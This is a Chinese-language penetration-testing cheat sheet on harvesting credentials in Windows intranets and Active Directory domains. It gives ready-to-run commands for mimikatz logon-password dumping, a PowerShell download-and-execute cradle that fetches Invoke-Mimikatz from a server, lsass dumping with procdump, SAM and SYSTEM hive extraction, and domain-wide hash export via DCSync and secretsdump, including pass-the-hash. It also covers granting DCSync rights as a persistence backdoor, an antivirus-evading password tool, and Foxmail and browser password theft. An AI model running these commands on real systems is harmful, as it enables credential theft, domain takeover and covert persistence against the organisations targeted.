不错的文章，内网密码解密大全<br />[https://mp.weixin.qq.com/s/JVI3wpl6hQ4Y63GbNuMRjA](https://mp.weixin.qq.com/s/JVI3wpl6hQ4Y63GbNuMRjA)

[https://blog.csdn.net/CCESARE/article/details/104746596](https://blog.csdn.net/CCESARE/article/details/104746596) navicat解密
<a name="TL9Zp"></a>
## 浏览器密码抓取
\BrowserGhost.exe<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614147236867-befdcd45-854c-4005-8a52-d6f3cb3e1532.png#height=443&id=nSfiM&originHeight=590&originWidth=1194&originalType=binary&ratio=1&rotation=0&showTitle=false&size=52167&status=done&style=none&title=&width=896)<br />hack-browser-data.exe直接运行，在results文件夹下会有所有csv文件<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614147976279-e74e2672-c499-4f8f-b46f-ed423e7d51e9.png#height=149&id=SJKbp&originHeight=199&originWidth=1017&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9628&status=done&style=none&title=&width=763)

![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614148011665-dc592848-951d-444f-9aa6-0ff50034e898.png#height=271&id=zrJU7&originHeight=362&originWidth=739&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28333&status=done&style=none&title=&width=554)

<a name="zwbZD"></a>
## Mimikatz
关于mimikatz，为什么有时候在域普通成员抓密码抓不到本地管理员密码？是因为该域普通成员不具备本地管理员的权限。如果域普通成员在本地管理员权限组，那么域普通成员就可以抓取本地管理员密码了。
<a name="GdDtM"></a>
### 本地抓密码
mimikatz.exe privilege::debug "sekurlsa::logonPasswords exit"  >1.txt

mimikatz # privilege::debug  （赋予管理员权限）<br />mimikatz # sekurlsa::logonpasswords<br />如果爆出以下错误可以用离线抓取的方法<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611388850526-54aa9739-daa4-4ba4-ab85-b42835a5a79a.png#height=50&id=ufRUK&originHeight=50&originWidth=379&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=379)

<a name="HDrxS"></a>
### powershell抓取

内网目标服务器无法通外网，可以找一台内网互通的服务器开启http服务，放置Invoke-Mimikatz.ps1  抓取密码。
```
powershell "IEX (New-Object Net.WebClient).DownloadString('http://10.26.32.106:8000/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626665426330-bdab741b-6874-4edf-a70a-ef6292d760c4.png#height=353&id=nRgwG&originHeight=706&originWidth=1612&originalType=binary&ratio=1&rotation=0&showTitle=false&size=601025&status=done&style=none&title=&width=806)

<a name="Sff5Z"></a>
### 导出域内所有hash
mimikatz # privilege::debug<br />Privilege '20' OK<br /> <br />mimikatz # lsadump::dcsync /domain:highsun.com /all /csv<br />mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.local /all /csv exit"  >1.txt<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611388850876-d8bf2efb-7eb5-4241-84cd-3ac8583271e7.png#height=561&id=Ghv0J&originHeight=748&originWidth=828&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=621)<br /> <br />[https://xz.aliyun.com/t/2527](https://xz.aliyun.com/t/2527)<br /> 
<a name="MVHl8"></a>
## Procdump
（最好在win7虚拟机操作） win10很多问题<br />使用Procdump工具把lsass.exe进程抓取成lsass.dmp文件`

`<br />Procdump.exe -accepteula -ma lsass.exe lsass.dmp （默认交互）<br />然后本地用mimikatz<br />sekurlsa::minidump c:\users\test\appdata\local\temp\lsass.dmp<br />sekurlsa::logonpasswords<br /> 
<a name="cxK7H"></a>
## 通过sam和system文件抓取密码
Reg save hklm\sam （路径）sam.hive   （其实有sam文件就能抓，但是只能抓NTLM hash<br />Reg save hklm\system system.hive<br />导出来后放到和mimikatz同一个文件夹<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611388851092-f4b0f8a2-8ec2-46d5-a44d-f80ab857e202.png#height=268&id=GEghs&originHeight=357&originWidth=815&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=611)<br /> <br /> <br />reg save HKLM\SYSTEM system.hiv<br />reg save HKLM\SAM sam.hiv<br />reg save HKLM\SECURITY sercrity.hiv<br />mimikatz.exe "lsadump::sam /system:system.hiv /sam:sam.hiv /sercrity:sercrity.hiv" exit
<a name="FQrF6"></a>
## 批量hash爆破
Invoke-TheHash.ps1<br /> <br />[https://blog.csdn.net/lhh134/article/details/104150949](https://blog.csdn.net/lhh134/article/details/104150949)

<a name="He0pq"></a>
## 导出域内所有hash
[https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L8270](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L8270)
<a name="kxcFj"></a>
### dcsync
这个dcsync，默认是以下四大用户才会具备权限，只要拥有dcsync权限的用户，就能离线导出域内所有hash的权利。如果是域管，也可以赋予某个域内普通用户具备这个dcsync权限，从而实现后门的权限维持。
> · Administrators组内的用户。
> · Domain Admins组内的用户。
> · Enterprise Admins组内的用户。
> · 域控制器的计算机帐户


powerview.ps1中执行如下命令，该用户就具备dcsync权限。就能直接导出域内所有hash<br /> #给域用户hack添加DCSync权限，需要域管身份登陆RDP，才能赋予权限。<br />Add-DomainObjectAcl -TargetIdentity "DC=aufeng,DC=com" -PrincipalIdentity aufeng111 -Rights DCSync -Verbose<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616129819981-3e23fa64-9cb2-4e81-a9e3-eade5878865e.png#height=456&id=K9QZ8&originHeight=608&originWidth=653&originalType=binary&ratio=1&rotation=0&showTitle=false&size=57231&status=done&style=none&title=&width=490)<br />**但是如果以域普通成员抓取mimikatz的话，是需要管理员权限的，所以域普通成员需要加入本地管理员组才行。**<br />**所以以域管身份登陆后，还得把域成员添加至本地管理员组。**<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616131381908-0414d2aa-3ced-4207-8bd3-02f7bd131758.png#height=522&id=XE172&originHeight=696&originWidth=934&originalType=binary&ratio=1&rotation=0&showTitle=false&size=90724&status=done&style=none&title=&width=701)<br />如果只是域普通用户，但是只是调用CMD框的时候用了域管登陆，也是没办法赋予权限的。需要以域管身份登陆了才可以。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616130166978-955e0bd2-71d7-4435-9ff2-0dc7f510f885.png#height=324&id=k2lkP&originHeight=432&originWidth=654&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45701&status=done&style=none&title=&width=491)<br />这个时候，在aufeng111的域普通账号上，就可以用Invoke-DCSync.ps1导出域内所有hash<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616133897136-a0257c48-2c0c-4bcb-bdfe-e3a09a5ea5b0.png#height=214&id=mQYXe&originHeight=286&originWidth=651&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18584&status=done&style=none&title=&width=488)<br /> <br />#域管给域用户hack删除DCSync权限<br />Remove-DomainObjectAcl -TargetIdentity "DC=aufeng,DC=com" -PrincipalIdentity aufeng111 -Rights DCSync -Verbose<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616133685426-2ba0402a-b9c2-49b1-a072-6208a5b825bf.png#height=444&id=K3pdq&originHeight=591&originWidth=630&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53296&status=done&style=none&title=&width=473)<br />这个时候密码就抓不出来了<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616134170299-342d3d94-6977-472c-85ae-e5e720e9758f.png#height=426&id=WYYrI&originHeight=568&originWidth=662&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20203&status=done&style=none&title=&width=497)

python3 secretsdump.py aufeng/aufeng111@10.0.0.100 -dc-ip 10.0.0.100 -just-dc-user administrator
<a name="Uj9IX"></a>
### Mimikatz的dcsync功能
**导出指定用户hash**<br />privilege::debug<br /> <br />#导出指定用户的信息(包括哈希)<br />lsadump::dcsync /domain:aufeng /user:administrator      <br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616059396375-b751b75d-2bd7-472c-ae3e-9c75115c95b2.png#height=458&id=DHD73&originHeight=610&originWidth=742&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69838&status=done&style=none&title=&width=557)<br />**导出域内所有hash**<br />利用Mimikatz的dcsync功能获取提取Ntds.dit中的哈希的操作如下：<br />1. 在域内任意一台主机上以域管理员权限运行mimikatz并执行如下命令：<br />privilege::debug<br />lsadump::dcsync /domain:god.org /all /csv<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616053259404-893390f3-68b3-4a42-add4-713936d2e51a.png#height=182&id=j3Z47&originHeight=242&originWidth=802&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27359&status=done&style=none&title=&width=602)

<a name="YHFWy"></a>
### Invoke-DCSync.ps1脚本
Import-Module .\Invoke-DCSync.ps1

在当前域中，使用域管权限调出cmd，导出当前域内所有hash<br />Invoke-DCSync -DumpForest | ft -wrap -autosize    // 导出域内所有用户的hash<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616054380811-1f544658-37c6-45eb-aaca-43028b932704.png#height=200&id=cMDnl&originHeight=266&originWidth=830&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23071&status=done&style=none&title=&width=623)<br />Invoke-DCSync -DumpForest -Users @("administrator") | ft -wrap -autosize      // 导出域内administrator账户的hash   导出域内指定用户的hash<br />但是会有很多报错。但是还会导出来指定的hash<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616054674033-1d42c856-02e2-4304-96cc-3d1c3058b45f.png#height=344&id=Vdyz9&originHeight=459&originWidth=663&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36702&status=done&style=none&title=&width=497)
<a name="fRGpi"></a>
### secretsdump
明文<br />./secretsdump.py aufeng/af:password@192.168.10.131 -dc-ip 192.168.10.131 -just-dc-user administrator

hash<br />proxychains python3 secretsdump.py WANGDI/wdadmin@192.168.233.10 -hashes :b5674dc1274c9bfb792c10137b92d8ef -dc-ip 192.168.233.10
<a name="2LXJe"></a>
## netpass 永远的神
有时候mimikatz无法抓取密码，但是netpass是永远的神。而且还能过火绒！免杀<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615726865601-9e92426d-2d48-4a61-803f-8e8416b21b05.png#height=450&id=RufL2&originHeight=600&originWidth=1244&originalType=binary&ratio=1&rotation=0&showTitle=false&size=249985&status=done&style=none&title=&width=933)

<a name="q5dYL"></a>
## nirsoft工具
整个压缩包拖进去解压出来用，但是大小25个m<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1654658231117-18f33936-3e00-48c4-b730-a27b4c87c1e2.png#clientId=u12166b47-0279-4&errorMessage=unknown%20error&from=paste&height=560&id=u10b1e0d4&originHeight=700&originWidth=1085&originalType=binary&ratio=1&rotation=0&showTitle=false&size=288897&status=error&style=none&taskId=u5e61f24f-3899-465c-be14-88288ecdcaa&title=&width=868)

<a name="H7VzO"></a>
## 获取foxmail密码
取出大概这个路径的文件<br /> D:\Foxmail 7.0\Storage\xxxx\Accounts\Account.rec0  <br />![878ccbe6-504d-423e-8b75-92e4fed59b10.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1653891645017-7239b37f-5059-4aff-89cd-22aed9cee6bb.png#clientId=u63556a2c-1cd4-4&errorMessage=unknown%20error&from=paste&height=205&id=ud0300729&originHeight=256&originWidth=2786&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56640&status=error&style=none&taskId=u71681450-6b95-483c-9af2-b469c80b7dd&title=&width=2228.8)
